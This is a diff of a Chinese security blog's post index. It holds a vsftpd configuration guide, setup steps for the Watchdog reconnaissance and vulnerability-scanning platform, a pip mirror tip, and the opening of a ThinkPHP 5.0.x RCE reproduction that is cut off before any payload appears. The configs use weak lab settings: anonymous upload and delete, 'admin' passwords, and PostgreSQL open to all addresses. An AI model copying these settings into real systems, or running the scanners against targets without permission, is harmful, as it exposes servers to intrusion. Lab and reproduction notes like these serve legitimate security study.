+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  全局设置</span><br><span class="line">listen_port&#x3D;21			#  设置监听端口</span><br><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf	#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">allow_writeable_chroot&#x3D;yes	#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br><span class="line">#  传输</span><br><span class="line">ascii_upload_enable&#x3D;yes		#  启用 ASCII 模式上传数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">ascii_download_enable&#x3D;yes	#  启用 ASCII 模式下载数据（配置文件内默认有该参数，但被注释了）</span><br><span class="line">#  被动模式相关（如启用了被动模式，则在客户端使用 ftp 访问时需使用 passive 关闭客户端的被动模式，强制其使用port方式连接。如需开启则再次运行该命令）</span><br><span class="line">pasv_enable&#x3D;yes         #  启用被动模式</span><br><span class="line">pasv_promiscuous&#x3D;yes	#  关闭 PASV 模式的安全检查（该检查确保数据连接和控制连接是来自同一 IP）</span><br><span class="line">pasv_max_port&#x3D;4500	#  PASV 使用的最大端口</span><br><span class="line">pasv_min_port&#x3D;4000	#  PASV 使用的最小端口</span><br><span class="line">pasv_address&#x3D;192.168.1.1	#  PASV 模式传输的地址（访问的客户端 IP 跟此处的 IP 不一致时会报错）</span><br><span class="line">#  限制</span><br><span class="line">max_clients&#x3D;100			#  最大客户端连接数为 100</span><br><span class="line">max_per_ip&#x3D;3			#  每个 IP 最大连接数为  3</span><br><span class="line">deny_file&#x3D;&#123;*.exe,&#39;*root*&#125;	#  禁止上传 .exe 的文件和文件名带有 root 的文件</span><br><span class="line">chroot_list_enable&#x3D;yes		#  启用限制用户的名单</span><br><span class="line">chroot_list_file&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;test	#  在 test 文件内指定用户列表（泽泻用户作为“例外”，不受限制）</span><br><span class="line">chroot_local_user&#x3D;yes		#  所有用户被限制在其主目录下（不能访问除主目录外的其他目录）</span><br><span class="line"></span><br><span class="line">#  匿名用户相关配置</span><br><span class="line">anonymous_enable&#x3D;yes		#  允许匿名用户访问（配置文件内默认有该参数）</span><br><span class="line">anon_root&#x3D;&#x2F;test			#  指定匿名用户目录</span><br><span class="line">#  匿名用户权限相关</span><br><span class="line">anon_upload_enable&#x3D;yes		#  允许匿名用户上传文件（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes	#  允许匿名用户创建目录（配置文件内默认有该参数，但被注释了）</span><br><span class="line">anon_world_readable_only&#x3D;yes	#  文件权限中其他用户需有可读的权限，匿名用户才能下载（文件权限分：用户、组、其他用户）</span><br><span class="line">anon_umask&#x3D;022		        #  设置匿名用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">#  匿名用户限制相关</span><br><span class="line">anon_max_rate&#x3D;30000		#  匿名用户限速为 30k&#x2F;s</span><br><span class="line">anon_other_write_enable&#x3D;yes	#  匿名用户拥有删除权限</span><br><span class="line"></span><br><span class="line">#  虚拟用户相关</span><br><span class="line">local_root&#x3D;&#x2F;test		#  指定虚拟用户目录（由于是基于本地用户的，所以需使用此行，文件权限设置为 777）</span><br><span class="line">guest_enable&#x3D;yes		#  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp		#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu	#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（默认有该行配置，但文件名为vsftpd）</span><br><span class="line">virtual_use_local_privs&#x3D;yes	#  使虚拟用户跟本地用户权限相同（配置此行后需使用用户的参数来配置虚拟用户）</span><br><span class="line"></span><br><span class="line">#  用户相关配置</span><br><span class="line">local_root&#x3D;&#x2F;test		#  指定用户访问目录</span><br><span class="line">local_umask&#x3D;022			#  设置用户新建文件的权限为 755（可理解为组跟其他用户不需要 2 权限，或  777 减去 022 ）</span><br><span class="line">local_max_rate&#x3D;30000		#  用户限速为 30k&#x2F;s</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="三、配置本地用户访问"><a href="#三、配置本地用户访问" class="headerlink" title="三、配置本地用户访问"></a>三、配置本地用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_root&#x3D;&#x2F;test</span><br></pre></td></tr></table></figure>
+<h3 id="2、创建用户"><a href="#2、创建用户" class="headerlink" title="2、创建用户"></a>2、创建用户</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd test    #  新建 test 用户</span><br><span class="line">passwd test     #  设置密码（此处需确认密码）</span><br></pre></td></tr></table></figure>
+<h3 id="3、创建目录"><a href="#3、创建目录" class="headerlink" title="3、创建目录"></a>3、创建目录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;test         #  创建目录</span><br><span class="line">chmod 755 &#x2F;test     #  设置目录权限</span><br><span class="line">chown test:test &#x2F;test   #  设置该目录所属用户跟组</span><br></pre></td></tr></table></figure>
+<p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p>
+<h3 id="4、登陆测试"><a href="#4、登陆测试" class="headerlink" title="4、登陆测试"></a>4、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="四、配置虚拟用户访问"><a href="#四、配置虚拟用户访问" class="headerlink" title="四、配置虚拟用户访问"></a>四、配置虚拟用户访问</h2><h3 id="1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1"><a href="#1、编辑-vsftpd-conf-配置文件，在文件末尾添加如下内容-1" class="headerlink" title="1、编辑 vsftpd.conf 配置文件，在文件末尾添加如下内容"></a>1、编辑 <code>vsftpd.conf</code> 配置文件，在文件末尾添加如下内容</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user_config_dir&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;user_conf	#  指定用户配置文件目录（配置文件需为对应的用户名）</span><br><span class="line">guest_enable&#x3D;yes		    #  开启用户身份映射（允许虚拟用户登陆）</span><br><span class="line">guest_username&#x3D;virtftp		#  设置映射的用户身份为 virtftp（virtftp 为真实用户）</span><br><span class="line">pam_service_name&#x3D;vsftpd.vu	#  开启 PAM 认证，配置文件路径为&#x2F;etc&#x2F;pam.d&#x2F;vsftpd.vu（需注释掉原有的行，并复制原文件另存为 vsftpd.vu）</span><br><span class="line">allow_writeable_chroot&#x3D;yes	#  加上此行解决报错（如用户被限定在其主目录下，则该用户不能在有写的权限，否则会报错）</span><br></pre></td></tr></table></figure>
+<h3 id="2、创建映射的账号并设置虚拟用户的账号跟密码"><a href="#2、创建映射的账号并设置虚拟用户的账号跟密码" class="headerlink" title="2、创建映射的账号并设置虚拟用户的账号跟密码"></a>2、创建映射的账号并设置虚拟用户的账号跟密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  创建虚拟用户映射的用户（该用户不可登陆）</span><br><span class="line">useradd -s &#x2F;sbin&#x2F;nologin virtftp</span><br><span class="line"></span><br><span class="line">#  创建存放用户名跟密码的文件</span><br><span class="line">touch ftpuser.txt</span><br></pre></td></tr></table></figure>
+<p><code>ftpuser.txt</code> 文件内容如下（单数行为用户名，双数行为密码）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftpadmin</span><br><span class="line">admin</span><br><span class="line">ftpuser</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+<p>由于保存虚拟用户跟密码的文本无法被直接调用，所以需生成数据库文件：<br><code>db_load -T -t hash -f ftpuser.txt ftpuser.db</code></p>
+<h3 id="3、创建用户配置文件"><a href="#3、创建用户配置文件" class="headerlink" title="3、创建用户配置文件"></a>3、创建用户配置文件</h3><p>创建虚拟用户的配置目录及其配置文件：<br><code>mkdir /etc/vsftpd/user_conf</code><br><code>touch /etc/vsftpd/user_conf/ftpadmin</code><br><code>touch /etc/vsftpd/user_conf/ftpuser</code></p>
+<p>ftpadmin 配置内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br><span class="line">anon_mkdir_write_enable&#x3D;yes</span><br><span class="line">anon_other_write_enable&#x3D;yes</span><br><span class="line">anon_umask&#x3D;022</span><br></pre></td></tr></table></figure>
+<p>ftpuser 配置内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon_upload_enable&#x3D;yes</span><br></pre></td></tr></table></figure>
+<h3 id="4、配置-PAM-认证"><a href="#4、配置-PAM-认证" class="headerlink" title="4、配置 PAM 认证"></a>4、配置 PAM 认证</h3><p>根据 vsftpd.conf 配置将 PAM 认证文件名更改为对应的名称：<br><code>mv /etc/pam.d/vsftpd /etc/pam.d/vsftpd.vu</code></p>
+<p>注释 <code>vsftpd.vu</code> 文件内所有行，并在文件末尾添加如下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  此处末尾的路径为虚拟用户账号跟密码文件所在的绝对路径（无需后缀名）</span><br><span class="line">auth	required	pam_userdb.so	db&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br><span class="line">account	required	pam_userdb.so	db&#x3D;&#x2F;etc&#x2F;vsftpd&#x2F;ftpuser</span><br></pre></td></tr></table></figure>
+<p>配置完后使用命令重启服务：<code>systemctl restart vsftpd</code></p>
+<h3 id="5、登陆测试"><a href="#5、登陆测试" class="headerlink" title="5、登陆测试"></a>5、登陆测试</h3><p>安装 <code>ftp</code> 工具：<code>yum -y install ftp</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  使用命令连接登陆测试</span><br><span class="line">ftp 192.168.1.123	#  如服务重启无报错，登陆失败则可能是 PAM 配置文件的问题</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="五、PAM-配置文件简介"><a href="#五、PAM-配置文件简介" class="headerlink" title="五、PAM 配置文件简介"></a>五、PAM 配置文件简介</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器名称    模块类型    控制方式    模块路径    模块参数</span><br></pre></td></tr></table></figure>
+<h3 id="服务器名称："><a href="#服务器名称：" class="headerlink" title="服务器名称："></a>服务器名称：</h3><p>设置服务器名称时字母需小写</p>
+<h3 id="模块类型："><a href="#模块类型：" class="headerlink" title="模块类型："></a>模块类型：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth        #  接受用户名和密码，进而对该用户的密码进行认证，并负责设置用户的一些秘密信息。</span><br><span class="line">account     #  检查帐户是否被允许登录系统，帐号是否已经过期，帐号的登录是否有时间段的限制等等。</span><br><span class="line">password    #  用来修改用户的密码，检测修改密码动作是否被允许以及新密码是否符合要求等。</span><br><span class="line">session     #  提供对会话的管理和记账。</span><br></pre></td></tr></table></figure>
+<h3 id="控制方式："><a href="#控制方式：" class="headerlink" title="控制方式："></a>控制方式：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">required    #  表示本模块必须返回成功才能通过认证，但是如果该模块返回失败的话，失败结果也不会立即通知用户，而是要等到同一 stack 中的所有模块全部执行完毕再将失败结果返回给应用程序。可以认为是一个必要条件。</span><br><span class="line">requisite   #  与required类似，该模块必须返回成功才能通过认证，但是一旦该模块返回失败，将不再执行同一 stack 内的任何模块，而是直 接将控制权返回给应用程序。是一个必要条件。</span><br><span class="line">sufficient  #  表明本模块返回成功已经足以通过身份认证的要求，不必再执行同一 stack 内的其它模块，但是如果本模块返回失败的话可以忽略。可以认为是一个充分条件。</span><br><span class="line">optional    #  表明本模块是可选的，它的成功与否一般不会对身份认证起关键作用，其返回值一般被忽略。</span><br><span class="line">include     #  将认证权利移交给其他文件。</span><br></pre></td></tr></table></figure>
+<h3 id="模块路径："><a href="#模块路径：" class="headerlink" title="模块路径："></a>模块路径：</h3><p>设置模块路径（需绝对路径）</p>
+<h3 id="模块参数："><a href="#模块参数：" class="headerlink" title="模块参数："></a>模块参数：</h3><p>传递给改模块的参数</p>
+]]></content>
+      <categories>
+        <category>网络应用竞赛</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Watchdog</title>
+    <url>/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/</url>
+    <content><![CDATA[<h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><p>详细参考：<a href="https://github.com/CTF-MissFeng/Watchdog">https://github.com/CTF-MissFeng/Watchdog</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 Python</span><br><span class="line">sudo apt-get install python3 python3-pip -y</span><br><span class="line">#  安装 Python 相关环境</span><br><span class="line">sudo apt install build-essential libssl-dev libffi-dev python3-dev -y</span><br><span class="line"></span><br><span class="line">#  安装 Nmap</span><br><span class="line">sudo apt install nmap -y</span><br><span class="line">#  安装 Chromium 浏览器</span><br><span class="line">sudo apt-get install chromium-browser -y</span><br><span class="line"></span><br><span class="line">#  下载环境</span><br><span class="line">mkdir &#x2F;test</span><br><span class="line">cd &#x2F;test</span><br><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;CTF-MissFeng&#x2F;Watchdog.git</span><br><span class="line">#  安装文件内的库</span><br><span class="line">sudo pip3 install -r &#x2F;test&#x2F;Watchdog&#x2F;requirements.txt</span><br></pre></td></tr></table></figure>
+<h2 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 PostgreSQL数据库</span><br><span class="line">sudo apt install postgresql postgresql-contrib -y</span><br><span class="line">#  指定 postgres 用户打开客户端工具 psql</span><br><span class="line">sudo -u postgres psql</span><br><span class="line">#  设置 postgres 用户密码（设置完后按 Ctrl + z 退出）</span><br><span class="line">\password postgres</span><br><span class="line"></span><br><span class="line">#  备份 PostgreSQL数据库 配置文件</span><br><span class="line">sudo cp -a &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf.bak_2021.2.8</span><br><span class="line"></span><br><span class="line">#  设置 PostgreSQL 数据库允许远程访问</span><br><span class="line">sudo sed -i &quot;60i listen_addresses &#x3D; &#39;*&#39;&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -i &quot;88i host  all  all 0.0.0.0&#x2F;0 md5&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br><span class="line"></span><br><span class="line">#  查看是否写入</span><br><span class="line">sed -n &quot;58,62p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;postgresql.conf</span><br><span class="line">sudo sed -n &quot;86,89p&quot; &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf</span><br></pre></td></tr></table></figure>
+<h2 id="修改-Watchdog-配置文件"><a href="#修改-Watchdog-配置文件" class="headerlink" title="修改 Watchdog 配置文件"></a>修改 Watchdog 配置文件</h2><h3 id="修改-web-数据库连接设置"><a href="#修改-web-数据库连接设置" class="headerlink" title="修改 web 数据库连接设置"></a>修改 web 数据库连接设置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  修改 web 数据库连接设置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;web&#x2F;config.py</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-1.png"></p>
+<h3 id="修改-client-数据库连接配置"><a href="#修改-client-数据库连接配置" class="headerlink" title="修改 client 数据库连接配置"></a>修改 client 数据库连接配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py.bak_2020.2.8</span><br><span class="line">#  修改 client 数据库连接配置</span><br><span class="line">sudo sed -i &#39;s&#x2F;postgres:\w\+&#x2F;postgres:admin&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line">sudo sed -i &#39;s&#x2F;127.0.0.1\&#x2F;src&#x2F;127.0.0.1&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;database.py</span><br><span class="line"></span><br><span class="line">#  重启数据库服务</span><br><span class="line">sudo systemctl restart postgresql</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/set_config-2.png"></p>
+<h3 id="添加-shodan-api"><a href="#添加-shodan-api" class="headerlink" title="添加 shodan api"></a>添加 shodan api</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  备份配置文件</span><br><span class="line">sudo cp -a &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py.bak_2021.2.8</span><br><span class="line">#  在域名扫描的工具模块内添加 shodan api（将此处命令中的 test 替换成 api）</span><br><span class="line">sudo sed -i &#39;s&#x2F;xxxxxx&#x2F;test&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall&#x2F;config.py</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/shodan_api.png"></p>
+<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改测试账户的密码为12345678（测试账户密码需大于或等于 8 位，否则将无法登陆 web）</span><br><span class="line">sudo sed -i &#39;s&#x2F;qazxsw@123&#x2F;12345678&#x2F;g&#39; &#x2F;test&#x2F;Watchdog&#x2F;app.py</span><br><span class="line">#  配置环境变量</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">export FLASK_APP&#x3D;app.py:APP</span><br><span class="line">#  查看帮助文档</span><br><span class="line">sudo flask --help</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户（如没修改账号跟密码则默认为：root&#x2F;qazxsw@123）</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/start.png"></p>
+<h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><h3 id="添加厂商"><a href="#添加厂商" class="headerlink" title="添加厂商"></a>添加厂商</h3><p>运行脚本前需添加厂商</p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-1.png"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Watchdog/Watchdog/web-2.png"></p>
+<h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动子域名扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;subdomain&#x2F;oneforall</span><br><span class="line">sudo python3 -u sbudomain_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u sbudomain_run.py &gt; dns.log 2&gt;&amp;1 &amp;</span><br><span class="line"># 查看日志</span><br><span class="line">cat dns.log</span><br></pre></td></tr></table></figure>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动端口扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;portscan</span><br><span class="line">sudo python3 -u portscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u portscan_run.py &gt; port.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat port.log</span><br></pre></td></tr></table></figure>
+<h3 id="url-扫描"><a href="#url-扫描" class="headerlink" title="url 扫描"></a>url 扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动url扫描</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;url_probe  </span><br><span class="line">sudo python3 -u urlscan_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u urlscan_run.py &gt; url.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat url.log</span><br></pre></td></tr></table></figure>
+<h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启动xray</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog&#x2F;client&#x2F;urlscan&#x2F;xray</span><br><span class="line">sudo python3 -u xray_run.py</span><br><span class="line"></span><br><span class="line">#  后台运行</span><br><span class="line">sudo nohup python3 -u xray_run.py &gt; xray.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat xray.log</span><br></pre></td></tr></table></figure>
+<h3 id="重置环境"><a href="#重置环境" class="headerlink" title="重置环境"></a>重置环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  进入 Watchdog 目录</span><br><span class="line">cd &#x2F;test&#x2F;Watchdog</span><br><span class="line">#  重置数据库</span><br><span class="line">sudo flask resetdb</span><br><span class="line">#  创建数据库</span><br><span class="line">sudo flask createdb</span><br><span class="line">#  创建测试账户</span><br><span class="line">sudo flask createuser</span><br><span class="line">#  启动服务（需确保端口没被占用）</span><br><span class="line">sudo flask run -p 8080 -h 0.0.0.0</span><br><span class="line"></span><br><span class="line">#  后台运行（需确保端口没被占用）</span><br><span class="line">sudo nohup flask run -p 8080 -h 0.0.0.0 &gt; web.log 2&gt;&amp;1 &amp;</span><br><span class="line">#  查看日志</span><br><span class="line">cat web.log</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>信息收集</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -171,6 +532,20 @@
       <tags>
         <tag>漏洞复现</tag>
         <tag>Redis 漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pip 更换源</title>
+    <url>/2021/02/09/Python/pip/pip/</url>
+    <content><![CDATA[<h2 id="pip-更换成国内源"><a href="#pip-更换成国内源" class="headerlink" title="pip 更换成国内源"></a>pip 更换成国内源</h2><p>在 <code>C:\Users\【用户名】\AppData\Roaming</code> 目录下新建 <code>pip</code> 文件夹，然后在文件夹内新建 <code>pip.ini</code> 文件</p>
+<p>文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 60000</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">use-mirrors &#x3D; true</span><br><span class="line">mirrors &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
+<h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  阿里云</span><br><span class="line">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">#  中国科技大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  豆瓣(douban)</span><br><span class="line">http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line">#  清华大学</span><br><span class="line">https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line">#  中国科学技术大学</span><br><span class="line">http:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -404,6 +779,140 @@
       </tags>
   </entry>
   <entry>
+    <title>ThinkPHP 5.0.2 - 5.0.23 RCE 漏洞复现</title>
+    <url>/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/</url>
+    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p>
+<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/1.jpg"></p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p>
